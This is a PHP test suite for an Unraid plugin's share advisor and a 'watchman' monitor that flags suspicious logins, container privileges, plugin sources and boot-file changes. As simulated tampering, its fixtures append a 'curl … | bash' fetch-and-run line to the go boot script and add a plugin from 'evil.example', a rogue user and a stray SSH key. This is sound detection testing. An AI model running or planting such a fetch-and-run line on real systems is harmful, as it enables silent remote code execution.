        $share('later', 'prefer', 'cache', 'array', [], ['disk1']),                  // nothing on its pool yet
        $share('gone', 'only', 'old', null, [], [], false, true),                    // a pool that doesn't exist
        $share('new', 'only', 'cache', null, []),                                    // no folder anywhere (yet)
        $share('moved', 'only', 'fast', null, ['cache']),                         // only elsewhere, not on its pool
    ];
    $asleep = ['disk2' => true, 'disk1' => false, 'cache' => false];

    // off: what would become exclusive — nothing else is told but the overflow
    $off = waExclusive($shares, $roots, $asleep, ['shareUserExclusive' => 'no', 'shareUser' => 'e']);
    same('exclusive off: permitted', false, $off['permitted']);
    same('exclusive off: would become exclusive', ['appdata'], $off['ready']);
    same('exclusive off: no reasons asked for yet', [[], []], [$off['unclear'], $off['elsewhere']]);
    same('exclusive off: only the secondary storage stands in the way', [
        ['name' => 'tm', 'pool' => 'fast', 'secondary' => 'cache', 'where' => ['cache']],
        ['name' => 'vms', 'pool' => 'cache', 'secondary' => 'array', 'where' => []]], $off['overflow']);
    same('exclusive off: asleep = roots not looked at', ['disk2'], $off['asleep']);
    same('exclusive: an empty share.cfg means off', false, waExclusive($shares, $roots, $asleep, [])['permitted']);

    // on: Unraid's word (shares.ini) for appdata and drop; reasons for those it refuses
    $on = $shares;
    $on[0]['storage']['exclusive'] = true;                                       // appdata: fine, nothing to say
    $on[] = $share('fresh', 'only', 'fast', null, ['fast']);                         // qualifies, Unraid still says no
    $r = waExclusive($on, $roots, $asleep, ['shareUserExclusive' => 'yes']);
    same('exclusive on: permitted', true, $r['permitted']);
    same('exclusive on: nothing "would become" any more', [], $r['ready']);
    same('exclusive on: a folder on another pool or disk', [
        ['name' => 'system', 'pool' => 'cache', 'where' => ['disk1']],
        ['name' => 'drop', 'pool' => 'fast', 'where' => ['cache']],
        ['name' => 'moved', 'pool' => 'fast', 'where' => ['cache']]], $r['elsewhere']);
    same('exclusive on: no reason in sight', ['fresh'], $r['unclear']);
    same('exclusive on: overflow still told', ['tm', 'vms'], array_column($r['overflow'], 'name'));

    // all exclusive that can be: nothing to tell
    $all = [$share('appdata', 'only', 'cache', null, ['cache'], [], true), $share('media', 'no', 'array', null, [], ['disk1']),
            $share('films', 'yes', 'cache', 'array', ['cache'], ['disk1'])];
    $quiet = waExclusive($all, $roots, [], ['shareUserExclusive' => 'yes']);
    same('exclusive: all done — no tip', [[], [], [], [], []],
        [$quiet['ready'], $quiet['unclear'], $quiet['elsewhere'], $quiet['overflow'], $quiet['asleep']]);

    // user shares off (no /mnt/user), the array stopped (no roots): nothing
    $noUser = waExclusive($shares, $roots, $asleep, ['shareUserExclusive' => 'no', 'shareUser' => '-']);
    same('exclusive: user shares off — nothing', [[], [], [], []], [$noUser['ready'], $noUser['unclear'], $noUser['elsewhere'], $noUser['overflow']]);
    $stopped = waExclusive($shares, [], [], ['shareUserExclusive' => 'no']);
    same('exclusive: array stopped — nothing', [[], []], [$stopped['ready'], $stopped['overflow']]);
    $numeric = $share('x', 'only', 'cache', null, ['cache']);
    $numeric['name'] = 2024;                                                         // array_keys() of shares.ini makes it an int
    same('exclusive: a numeric share name stays a string', ['2024'], waExclusive([$numeric], $roots, [], [])['ready']);

    // the page builds four tips from it: each needs its title and why (the other languages are compared to English)
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/whereabouts/lang/en.json'), true);
    foreach (['exclusive_off', 'exclusive_elsewhere', 'exclusive_unclear', 'exclusive_overflow'] as $id) {
        check("whereabouts: texts for tip $id", isset($en["adv.$id.title"], $en["adv.$id.why"]));
        check("whereabouts: tip $id is built in desk.js",
            str_contains((string) file_get_contents(OFFICE_DIR . '/public/desks/whereabouts/desk.js'), "add('$id',"));
    }
}

/**
 * The night watchman: his login lines, bursts of failures, the syslog by
 * offset and rotation, rights and plugin sources, and a whole watch on copies
 * — taking over (nothing reported), a night with changes (one entry each,
 * one notification per kind), «I know, thanks» (the new normal), the team
 * lead's note, hired anew.
 */
function testWatchman(): void
{
    $now = strtotime('2026-10-06 12:00:00');
    $known = ['root' => true, 'benj' => true];
    $p = fn (string $l) => watchmanParseLine($l, $known, $now);
    $pick = fn (?array $e, array $keys) => $e === null ? null : array_map(fn ($k) => $e[$k], $keys);

    // lines: Unraid's web login (dynamix/include/.login.php) and SSH
    same('watch line: web login', [true, 'web', 'root', '192.168.7.125', strtotime('2026-10-06 11:58:01')],
        $pick($p('Oct  6 11:58:01 Tower webgui: Successful login user root from 192.168.7.125'), ['ok', 'service', 'user', 'ip', 'time']));
    same('watch line: web failure with its cooldown', [false, 'root', '192.168.7.66'],
        $pick($p('Oct  6 11:58:02 Tower webgui: Unsuccessful login user root from 192.168.7.66. Ignoring login attempts for 900 seconds.'), ['ok', 'user', 'ip']));
    same('watch line: what was typed as the name is never the address, nor kept unless a user', [false, null, '10.0.0.5'],
        $pick($p('Oct  6 11:58:03 Tower webgui: Unsuccessful login user hunter2 from 9.9.9.9 from 10.0.0.5. '), ['ok', 'user', 'ip']));
    same('watch line: SSH with a key', [true, 'ssh:publickey', 'root', '192.168.7.219'],
        $pick($p('Oct  6 11:59:00 Tower sshd-session[2347524]: Accepted publickey for root from 192.168.7.219 port 59009 ssh2: RSA SHA256:abc'), ['ok', 'service', 'user', 'ip']));
    same('watch line: SSH password failed', [false, 'ssh:password', 'root', '203.0.113.9'],
        $pick($p('Oct  6 11:59:01 Tower sshd[123]: Failed password for root from 203.0.113.9 port 4242 ssh2'), ['ok', 'service', 'user', 'ip']));
    same('watch line: "Failed … for invalid user" counts through its "Invalid user" line', null,
        $p('Oct  6 11:59:02 Tower sshd[123]: Failed password for invalid user admin from 203.0.113.9 port 4243 ssh2'));
    same('watch line: invalid user, the name not kept', [false, null, '203.0.113.9'],
        $pick($p('Oct  6 11:59:02 Tower sshd[123]: Invalid user admin from 203.0.113.9 port 4243'), ['ok', 'user', 'ip']));
    same('watch line: IPv4 inside IPv6', '192.168.7.5', $p('Oct  6 11:59:03 Tower sshd-session[9]: Accepted password for root from ::ffff:192.168.7.5 port 1 ssh2')['ip'] ?? null);
    same('watch line: other lines are none', [null, null, null], [
        $p('Oct  6 11:59:04 Tower sshd-session[9]: Postponed publickey for root from 1.2.3.4 port 5 ssh2 [preauth]'),
        $p('Oct  6 11:59:04 Tower webgui: TimeMachine: Could not download icon /boot/config/plugins/dockerMan/images/x.png'),
        $p('Oct  6 11:59:04 Tower webgui: Successful login user root from not-an-address')]);
    same('watch time: December read in January', '2025-12-31 23:59:00',
        date('Y-m-d H:i:s', (int) watchmanLineTime('Dec 31 23:59:00 Tower x', strtotime('2026-01-01 00:10:00'))));

    // bursts: WATCH_FAIL_BURST failures from one address within WATCH_FAIL_WINDOW
    $fail = fn (int $t, ?string $u = 'root', string $ip = '203.0.113.9') => ['ok' => false, 'service' => 'ssh:password', 'user' => $u, 'ip' => $ip, 'time' => $t];
    $fails = [];
    $adds = [];
    foreach ([0, 60, 120, 180] as $t) {
        $adds[] = watchmanFailStep($fails, $fail($now + $t));
    }
    $adds[] = watchmanFailStep($fails, $fail($now + 240, null));
    $adds[] = watchmanFailStep($fails, $fail($now + 300));
    same('watch burst: four are nothing, the fifth starts it with all five, then one each', [0, 0, 0, 0, 5, 1], $adds);
    same('watch burst: names tried (users only) and unknown ones counted', [['root'], 1], [$fails['203.0.113.9']['users'], $fails['203.0.113.9']['unknown']]);
    same('watch burst: a pause longer than the window starts anew', 0, watchmanFailStep($fails, $fail($now + 301 + WATCH_FAIL_WINDOW)));
    $slow = [];
    $n = 0;
    foreach (range(0, 9) as $i) {
        $n += watchmanFailStep($slow, $fail($now + $i * 200, 'root', '198.51.100.1'));
    }
    same('watch burst: ten failures 200 s apart are no burst', 0, $n);

    // the syslog by offset; rotated: the rest of syslog.1 (by inode), then the new one; nothing twice
    $tmp = sys_get_temp_dir() . '/office-tests-watch-' . getmypid();
    @mkdir($tmp, 0700, true);
    $log = "$tmp/syslog";
    file_put_contents($log, "Oct  6 10:00:00 Tower webgui: Successful login user root from 192.168.7.10\nOct  6 10:00:01 Tower kernel: x\n");
    [$ev, $pos] = watchmanReadLogins($log, null, true, $known, $now);
    same('watch read: taking over reads all of it', [['192.168.7.10'], filesize($log)], [array_column($ev, 'ip'), $pos['size']]);
    [$ev, $pos2] = watchmanReadLogins($log, null, false, $known, $now);
    same('watch read: without a position, from now on', [[], filesize($log)], [$ev, $pos2['size']]);
    file_put_contents($log, "Oct  6 10:01:00 Tower webgui: Successful login user root from 192.168.7.11\n"
        . 'Oct  6 10:01:01 Tower webgui: Successful login user root from 192.168.7.12', FILE_APPEND);
    [$ev, $pos] = watchmanReadLogins($log, $pos, false, $known, $now);
    same('watch read: only what came, whole lines', ['192.168.7.11'], array_column($ev, 'ip'));
    rename($log, "$log.1");
    file_put_contents("$log.1", "\n", FILE_APPEND);
    file_put_contents($log, "Oct  6 10:02:00 Tower sshd[1]: Accepted publickey for root from 192.168.7.13 port 1 ssh2\n");
    [$ev, $pos, $info] = watchmanReadLogins($log, $pos, false, $known, $now);
    same('watch read: rotated — the rest of the old file, then the new one', [true, ['192.168.7.12', '192.168.7.13']],
        [$info['rotated'], array_column($ev, 'ip')]);
    same('watch read: nothing twice', [], watchmanReadLogins($log, $pos, false, $known, $now)[0]);
    exec('rm -rf ' . escapeshellarg($tmp));

    // rights as docker run flags; a plugin's source from its own entities
    same('watch rights', ['--cap-add=SYS_ADMIN', '--device=/dev/fuse', '--network=host', '--privileged', '-p 127.0.0.1:8080:80/tcp', '-p 9090/tcp', '-v /var/run/docker.sock'],
        watchmanContainerTokens(['Privileged' => true, 'NetworkMode' => 'host', 'PidMode' => '', 'CapAdd' => ['CAP_SYS_ADMIN'],
            'Devices' => [['PathOnHost' => '/dev/fuse']], 'PortBindings' => ['80/tcp' => [['HostIp' => '127.0.0.1', 'HostPort' => '8080']], '9090/tcp' => [['HostIp' => '', 'HostPort' => '']]]],
            [['Type' => 'bind', 'Source' => '/var/run/docker.sock'], ['Type' => 'bind', 'Source' => '/mnt/user/appdata/x']]));
    same('watch rights: published ports alone are none', [], watchmanRights(['-p 80:80/tcp']));
    $plg = "<!ENTITY name \"filesviewer\">\n<!ENTITY branch \"main\">\n<!ENTITY version \"2026.08.24\">\n"
         . "<!ENTITY pluginURL \"https://github.com/x/releases/download/&version;/&name;.txz\">\n"
         . "<!ENTITY selfURL \"https://raw.githubusercontent.com/Lazaros-Chalkidis/unraid-filesviewer/&branch;/&name;.plg\">\n"
         . "<PLUGIN name=\"&name;\" version=\"&version;\"\n        pluginURL=\"&selfURL;\" launch=\"x\">";
    same('watch plugin: the <PLUGIN> attribute, entities resolved', ['https://raw.githubusercontent.com/Lazaros-Chalkidis/unraid-filesviewer/main/filesviewer.plg', '2026.08.24'],
        watchmanPluginUrl($plg));
    same('watch plugin: source with the owner on code hosts', ['raw.githubusercontent.com/Lazaros-Chalkidis', 'stable.dl.unraid.net', ''],
        [watchmanSource(watchmanPluginUrl($plg)[0]), watchmanSource('https://stable.dl.unraid.net/x.plg'), watchmanSource(null)]);

    // a whole watch, on copies
    $tmp = sys_get_temp_dir() . '/office-tests-watch-' . getmypid();
    $src = "$tmp/src";
    $data = "$tmp/data";
    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
    $history = $line($now - 7200, 'webgui: Successful login user root from 192.168.7.10');
    foreach (range(0, 5) as $i) {      // a client that keeps failing (it had a burst before he came)
        $history .= $line($now - 5000 + $i, 'webgui: Unsuccessful login user root from 192.168.7.66. ');
    }
    file_put_contents($paths['syslog'], $history);
    $plgFile = fn (string $owner) => "<!ENTITY name \"ca\">\n<!ENTITY github \"$owner/ca\">\n"
        . "<!ENTITY pluginURL \"https://raw.githubusercontent.com/&github;/master/&name;.plg\">\n<PLUGIN name=\"&name;\" version=\"1\" pluginURL=\"&pluginURL;\">\n";
    file_put_contents("$src/plugins/ca.plg", $plgFile('unraid'));
    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp &\n");
    file_put_contents($paths['passwd'], "root:x:0:0:Console and webGui login account:/root:/bin/bash\nbenj:x:1000:100::/:/bin/false\n");
    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n" . 'benj:$6$cc$dd:20000:0:99999:7:::' . "\n");
    $key = fn (string $c) => 'ssh-ed25519 ' . base64_encode("\0\0\0\x0bssh-ed25519\0\0\0\x20" . random_bytes(32)) . " $c";
    file_put_contents("$src/ssh/root/authorized_keys", $key('benj@mac') . "\n");
    $sec = fn (string $media) => "[\"appdata\"]\nexport=\"e\"\nsecurity=\"private\"\n[\"Media\"]\nexport=\"$media\"\nsecurity=\"public\"\n[\"flash\"]\nexport=\"-\"\nsecurity=\"public\"\n";
    file_put_contents($paths['sec'], $sec('-'));
    file_put_contents($paths['sec_nfs'], "[\"appdata\"]\nexport=\"-\"\nsecurity=\"public\"\n");
    file_put_contents($paths['share_cfg'], "shareSMBEnabled=\"yes\"\nshareNFSEnabled=\"no\"\n");
    $containers = ['kopia' => ['image' => 'kopia', 'tokens' => ['--cap-add=SYS_ADMIN']], 'plex' => ['image' => 'plex', 'tokens' => ['-p 32400:32400/tcp']]];
    $docker = function () use (&$containers) {
        return $containers;
    };
    $acks = "$tmp/acks.json";
    $notified = "$tmp/notified";
    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($notified) . "\necho >> " . escapeshellarg($notified) . "\n");
    chmod("$tmp/notify", 0755);
    $envBefore = getenv('OFFICE_NOTIFY_BIN');
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
    $calls = fn () => array_values(array_filter(explode("\n", (string) @file_get_contents($notified))));
    $open = fn () => array_count_values(array_column(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'), 'kind'));

    $r = watchmanRound($paths, $data, 1000, $now, $docker, true, $acks);
    $d = watchmanLoad($data);
    same('watch: the first round takes over and reports nothing', [true, [], [], 0], [$r['fresh'], $r['added'], $open(), count($calls())]);
    same('watch: what is normal now', [['192.168.7.10'], ['192.168.7.66'], ['kopia', 'plex'], ['ca' => 'raw.githubusercontent.com/unraid'], ['root', 'benj'], 1, ['Media', 'appdata', 'flash']],
        [array_keys($d['baseline']['ips']), array_keys($d['baseline']['fail_ips']), array_keys($d['baseline']['containers']),
         array_map(fn ($x) => $x['source'], $d['baseline']['plugins']), $d['baseline']['flash']['users'], count($d['baseline']['flash']['keys']['root']),
         array_keys($d['baseline']['shares'])]);
    same('watch: one line in the book that he took over', ['watch'], array_column($d['book'], 'kind'));
    check('watch: never a password field in his files', !str_contains((string) file_get_contents("$data/baseline.json") . file_get_contents("$data/seen.json"), '$6$'));
    same('watch: the team lead hears "quiet"', [['quiet', true]], array_map(fn ($f) => [$f['id'], $f['ok']], watchmanChecks($data)));

    // the night: what differs
    $t = $now + 300;
    $night = $line($t, 'webgui: Successful login user root from 10.9.8.7')
           . $line($t, 'sshd-session[5]: Accepted publickey for root from 192.168.7.10 port 2 ssh2: ED25519 SHA256:x');
    foreach (range(0, 5) as $i) {
        $night .= $line($t + $i, 'sshd[7]: Failed password for root from 203.0.113.9 port ' . (4000 + $i) . ' ssh2');
        $night .= $line($t + $i, 'webgui: Unsuccessful login user root from 192.168.7.66. ');
    }
    file_put_contents($paths['syslog'], $night, FILE_APPEND);
    $containers['plex']['tokens'] = ['--privileged', '-p 32400:32400/tcp', '-p 8080:80/tcp'];
    $containers['kopia']['tokens'] = [];
    $containers['vpn'] = ['image' => 'wireguard', 'tokens' => ['--cap-add=NET_ADMIN', '--network=host']];
    $containers['web'] = ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp']];
    file_put_contents("$src/plugins/ca.plg", $plgFile('someone'));
    file_put_contents("$src/plugins/evil.plg", "<PLUGIN name=\"evil\" version=\"1\" pluginURL=\"https://evil.example/evil.plg\">\n");
    file_put_contents($paths['go'], "curl -s https://example.com/x | bash\n", FILE_APPEND);
    file_put_contents("$src/extra/tool.txz", 'x');
    file_put_contents($paths['passwd'], "eve:x:1001:100::/:/bin/false\n", FILE_APPEND);
    file_put_contents($paths['shadow'], 'root:$6$ee$ff:20001:0:99999:7:::' . "\n" . 'benj:$6$cc$dd:20000:0:99999:7:::' . "\n" . 'eve:$6$gg$hh:20001:0:99999:7:::' . "\n");
    file_put_contents("$src/ssh/root/authorized_keys", $key('someone@else') . "\n", FILE_APPEND);
    file_put_contents($paths['sec'], $sec('e'));
    $r = watchmanRound($paths, $data, 1000, $now + 600, $docker, true, $acks);
    $kinds = $open();
    ksort($kinds);
    same('watch: one entry for each thing that differs', ['container_new' => 1, 'container_ports' => 1, 'container_privileged' => 1,
        'flash_extra' => 1, 'flash_go' => 1, 'flash_password' => 1, 'flash_ssh_key' => 1, 'flash_user' => 1, 'login_failures' => 1,
        'login_new_ip' => 1, 'plugin_new' => 1, 'plugin_source' => 1, 'share_public' => 1], $kinds);
    $d = watchmanLoad($data);
    $by = array_column(array_filter($d['book'], 'watchmanOpen'), null, 'kind');
    same('watch: the burst — how many, who', [6, ['root'], '203.0.113.9'], [$by['login_failures']['count'], $by['login_failures']['p']['users'], $by['login_failures']['p']['ip']]);
    same('watch: an address known for failing is counted, not reported', 6, $d['baseline']['fail_ips']['192.168.7.66']['quiet'] ?? null);
    same('watch: fewer rights are the new normal', [], $d['baseline']['containers']['kopia']['tokens']);
    same('watch: a new container with only ports is normal', ['-p 80:80/tcp'], $d['baseline']['containers']['web']['tokens'] ?? null);
    same('watch: rights as flags, the plugin source moved', ['--privileged', 'raw.githubusercontent.com/someone', 'raw.githubusercontent.com/unraid', ['added' => 1, 'removed' => 0]],
        [watchmanText($by['container_privileged'])['rights'], $by['plugin_source']['p']['source'], $by['plugin_source']['p']['old'], watchmanText($by['flash_go'])]);
    $c = $calls();
    same('watch: one notification per important kind (ports only in the book)', 12, count($c));
    $lang = officeNotifyLang();
    check('watch: the notification in Unraid\'s language',
        str_contains(implode("\n", $c), OFFICE_NOTIFY_EVENT . ': ' . officeNotifyText('watchman', 'notify.login_failures', ['n' => 1] + watchmanText($by['login_failures']), $lang)));
    $f = array_column(watchmanChecks($data), null, 'id');
    same('watch: the team lead gets one finding per kind, recommended, with the newest', [13, 'recommended', false, 1, '10.9.8.7'],
        [count($f), $f['login_new_ip']['level'], $f['login_new_ip']['ok'], $f['login_new_ip']['params']['n'], $f['login_new_ip']['params']['ip']]);

    // the same again, the burst going on: no new entry, nothing told again
    file_put_contents($paths['syslog'], $line($t + 30, 'sshd[7]: Failed password for root from 203.0.113.9 port 4999 ssh2'), FILE_APPEND);
    $r = watchmanRound($paths, $data, 1000, $now + 900, $docker, true, $acks);
    same('watch: seen again — nothing new, the burst counts on, nobody told twice', [[], 7, 12],
        [$r['added'], array_column(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'), null, 'kind')['login_failures']['count'], count($calls())]);

    // «I know, thanks»: one, then the rest — the new normal
    $id = $by['container_privileged']['id'];
    watchmanAck($id, $data, $now + 1000, false);
    same('watch ack: the container\'s new right is normal now', true, in_array('--privileged', watchmanLoad($data)['baseline']['containers']['plex']['tokens'], true));
    try {
        watchmanAck($id, $data, $now + 1001, false);
        check('watch ack: twice is refused', false);
    } catch (Problem $e) {
        same('watch ack: twice is refused', 'watch_gone', $e->key);
    }
    // the team lead noted the plugin finding: here it counts as noted too
    $plugin = array_column(watchmanChecks($data), null, 'id')['plugin_new'];
    file_put_contents($acks, json_encode(['acks' => [caretakerAckSig('watchman', $plugin) => ['desk' => 'watchman', 'id' => 'plugin_new', 'time' => $now, 'seen' => $now]]]));
    $r = watchmanRound($paths, $data, 1000, $now + 1200, $docker, true, $acks);
    $d = watchmanLoad($data);
    same('watch: the team lead\'s note counts here too', ['teamlead', 'evil.example'],
        [array_column($d['book'], null, 'kind')['plugin_new']['by'] ?? null, $d['baseline']['plugins']['evil']['source'] ?? null]);
    watchmanAck('*', $data, $now + 1300, false);
    same('watch ack: all noted, nothing open', [], $open());
    $r = watchmanRound($paths, $data, 1000, $now + 1500, $docker, true, $acks);
    same('watch: after noting, the same state reports nothing', [[], []], [$r['added'], $open()]);
    $b = watchmanLoad($data)['baseline'];
    same('watch: noted is normal (address, share, user, key, go)', [true, 2, true, 2, 3],
        [isset($b['ips']['10.9.8.7']), $b['shares']['Media']['smb'], in_array('eve', $b['flash']['users'], true), count($b['flash']['keys']['root']),
         count($b['flash']['go']['lines'])]);

    // a new burst within the hour after the last message: in the book, told only later
    $before = count($calls());
    file_put_contents($paths['syslog'], implode('', array_map(fn ($i) => $line($now + 1600 + $i, "sshd[8]: Invalid user x$i from 198.51.100.7 port $i"), range(0, 4))), FILE_APPEND);
    $r = watchmanRound($paths, $data, 1000, $now + 1700, $docker, true, $acks);
    same('watch notify: within the quiet hour — in the book, not told yet', [['login_failures'], $before], [$r['added'], count($calls())]);
    $r = watchmanRound($paths, $data, 1000, $now + 300 + 600 + WATCH_NOTIFY_QUIET, $docker, true, $acks);
    same('watch notify: after the hour — told', [[['kind' => 'login_failures', 'n' => 1, 'sent' => true]], $before + 1], [$r['told'], count($calls())]);

    // the page and the metrics: newest first, no internals
    $page = watchmanPageState($data, $now + 5000, false);
    check('watch page: newest first', $page['book'][0]['last'] >= end($page['book'])['last']);
    check('watch page: no internal values', !str_contains(json_encode($page), '"_h"'));
    $failing = array_column($page['watch']['fail_ips'], 'ip');
    sort($failing);
    same('watch page: what he keeps an eye on', [2, ['192.168.7.66', '203.0.113.9'], ['Media']],
        [count($page['watch']['ips']), $failing, array_column($page['watch']['shares']['open'], 'share')]);
    $m = watchmanMetrics($data);
    same('watch metrics: open per kind, the last round', ['uso_watchman_open_findings', count(WATCH_KINDS), 1, 'uso_watchman_last_round_timestamp_seconds', $now + 300 + 600 + WATCH_NOTIFY_QUIET],
        [$m[0]['name'], count($m[0]['samples']), array_column(array_map(fn ($s) => [$s[0]['kind'], $s[1]], $m[0]['samples']), 1, 0)['login_failures'], $m[1]['name'], $m[1]['samples'][0][1]]);

    // the switch (like the team lead's): off — nothing told, and what came meanwhile stays untold once it is on again
    $book2 = [watchmanEntry('flash_user', 'flash_user:zed', $now, ['user' => 'zed'])];
    $st2 = ['notify' => false];
    $before = count($calls());
    $t2 = watchmanNotifyDue($book2, $st2, $now + 99999, true, 'en');
    same('watch switch off: nothing told, the entry muted', [[], $before, true, null], [$t2, count($calls()), !empty($book2[0]['muted']), $book2[0]['told'] ?? null]);
    $st2['notify'] = true;
    $t2 = watchmanNotifyDue($book2, $st2, $now + 99999 + 60, true, 'en');
    same('watch switch on again: what came meanwhile stays untold', [[], $before], [$t2, count($calls())]);
    $book2[] = watchmanEntry('flash_user', 'flash_user:amy', $now, ['user' => 'amy']);
    $t2 = watchmanNotifyDue($book2, $st2, $now + 99999 + 120, true, 'en');
    same('watch switch on: what is new is told', [[['kind' => 'flash_user', 'n' => 1, 'sent' => true]], $before + 1], [$t2, count($calls())]);
    same('watch switch: on by default', true, watchmanPageState($data, $now + 5000, false)['notify']['on']);
    watchmanNotifySet(false, $data, false);
    same('watch switch: kept in his state, the page sees it', [false, false], [watchmanLoad($data)['state']['notify'] ?? null, watchmanPageState($data, $now + 5000, false)['notify']['on']]);
    watchmanNotifySet(true, $data, false);
    try {
        watchmanNotifySet('yes', $data, false);
        check('watch switch: only true or false', false);
    } catch (Problem $e) {
        same('watch switch: only true or false', 'bad_request', $e->key);
    }

    // hired anew: a new look at what is normal, what was open is closed
    $r = watchmanRound($paths, $data, 2000, $now + 9000, $docker, true, $acks);
    $d = watchmanLoad($data);
    same('watch: hired anew — taken over again, nothing open', [true, [], 2, 'baseline'],
        [$r['fresh'], $open(), count(array_filter($d['book'], fn ($e) => $e['kind'] === 'watch')), array_column($d['book'], null, 'kind')['login_failures']['by'] ?? null]);

    // the book keeps WATCH_BOOK_MAX entries, open ones first
    $book = [];
    foreach (range(1, WATCH_BOOK_MAX + 10) as $i) {
        $book[] = ['noted' => $now] + watchmanEntry('flash_user', "flash_user:u$i", $now, ['user' => "u$i"]);
    }
    $book[] = watchmanEntry('flash_go', 'flash_go', $now, []);
    $kept = watchmanPrune($book, $now + 60);
    same('watch book: capped, the open one kept', [WATCH_BOOK_MAX, 1], [count($kept), count(array_filter($kept, 'watchmanOpen'))]);
    same('watch book: noted ones go after their days', 1, count(watchmanPrune($book, $now + WATCH_BOOK_DAYS * 86400 + 1)));

    // every kind has its texts
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/watchman/lang/en.json'), true) ?: [];
    foreach (array_keys(WATCH_KINDS) as $kind) {
        foreach (["check.$kind", "check.{$kind}_how", "entry.$kind", "notify.$kind", "adopt.$kind"] as $k) {
            check("watchman: text $k", isset($en[$k]));
        }
    }
    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
    @unlink(watchmanLockFile($data, 'book'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * What is gone (a container removed, a plugin uninstalled, a share deleted) leaves "What I keep an eye
 * on" at once — counted is what is there — but he still remembers it: one that comes back the same is quiet
 */
function testWatchmanGone(): void
{
    $now = 1791280000;
    $known = ['app' => ['tokens' => ['--privileged'], 'seen' => $now - 600], 'db' => ['tokens' => [], 'seen' => $now - 600]];
    $book = [];
    $added = watchmanContainersCompare($known, ['db' => ['image' => 'postgres', 'tokens' => []]], $book, $now);
    same('watch gone: a container removed — nothing to tell, still remembered', [[], true], [$added, isset($known['app'])]);
    $added = watchmanContainersCompare($known, ['db' => ['image' => 'postgres', 'tokens' => []], 'app' => ['image' => 'x', 'tokens' => ['--privileged']]], $book, $now + 600);
    same('watch gone: back with the same rights — quiet', [[], []], [$added, $book]);
    $added = watchmanContainersCompare($known, ['db' => ['image' => 'postgres', 'tokens' => []], 'app' => ['image' => 'x', 'tokens' => ['--privileged', '--network=host']]], $book, $now + 900);
    same('watch gone: back with more — told', ['container_host'], $added);

    $tmp = sys_get_temp_dir() . '/office-tests-gone-' . getmypid();
    @mkdir($tmp, 0700, true);
    $b = ['hired' => 1000, 'time' => 1000, 'ips' => [], 'fail_ips' => [], 'flash' => ['go' => null, 'extra' => [], 'users' => ['root'], 'pw' => [], 'keys' => []],
          'containers' => ['app' => ['tokens' => ['--privileged'], 'seen' => $now], 'db' => ['tokens' => ['-p 5432:5432/tcp'], 'seen' => $now], 'web' => ['tokens' => [], 'seen' => $now],
                           'Grafana' => ['tokens' => ['-p 3000:3000/tcp'], 'seen' => $now - 900], 'zz-test' => ['tokens' => ['--privileged'], 'seen' => $now - 900]],
          'plugins' => ['user.scripts' => ['source' => 'raw.githubusercontent.com/x', 'version' => '1', 'seen' => $now],
                        'vmbackup' => ['source' => 'raw.githubusercontent.com/y', 'version' => '2', 'seen' => $now - 900]],
          'shares' => ['Filme' => ['smb' => 2, 'nfs' => 0, 'seen' => $now], 'appdata' => ['smb' => 0, 'nfs' => 0, 'seen' => $now],
                       'zz-test' => ['smb' => 2, 'nfs' => 0, 'seen' => $now - 900]],
          'sched' => null];
    file_put_contents("$tmp/baseline.json", json_encode($b));
    file_put_contents("$tmp/seen.json", json_encode(['containers' => ['app' => [], 'db' => [], 'web' => []], 'plugins' => ['user.scripts' => []],
                                                     'shares' => ['Filme' => [], 'appdata' => []]]));
    $w = watchmanPageState($tmp, $now, false)['watch'];
    same('watch gone: counted and listed is what is there now', [3, ['app', 'db'], ['user.scripts'], 2, ['Filme']],
        [$w['containers']['count'], array_column($w['containers']['special'], 'name'), array_column($w['plugins'], 'name'), $w['shares']['count'],
         array_column($w['shares']['open'], 'share')]);
    @unlink("$tmp/seen.json");
    $w = watchmanPageState($tmp, $now, false)['watch'];
    same('watch gone: without the last round\'s look — his memory as it is', [5, 2, 3], [$w['containers']['count'], count($w['plugins']), $w['shares']['count']]);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * A User Script started «in the background» goes through atd (User Scripts' backgroundScript.sh:
 * echo startBackground.php "/tmp/user.scripts/tmpScripts/<name>/script" | at NOW -M): a plain line in
 * the book, noted by itself — only when the job is exactly that, for a script that exists, with an
 * environment that can't run something else. Anything else in the queue stays an at_job.
 */
function testWatchmanAtUserScript(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-atus-' . getmypid();
    $us = "$tmp/src/flash/user.scripts";
    foreach (['temporäre_rsyncs_4', 'CKW Batch 2026'] as $n) {
        @mkdir("$us/scripts/$n", 0700, true);
        file_put_contents("$us/scripts/$n/script", "#!/bin/bash\necho $n\n");
    }
    $head = fn (string $env = '') => "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\nSHELL=/bin/bash; export SHELL\nPWD=/; export PWD\nHOME=/; export HOME\n"
        . "PATH=/bin:/sbin:/usr/bin:/usr/sbin; export PATH\nunraiduuid=0123\\-abcd; export unraiduuid\n$env"
        . "cd /usr/local/emhttp/plugins/user\\.scripts || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n";
    $wrap = fn (string $cmds) => "\${SHELL:-/bin/sh} << 'marcinDELIMITER5c3e1b2a'\n$cmds\nmarcinDELIMITER5c3e1b2a\n";
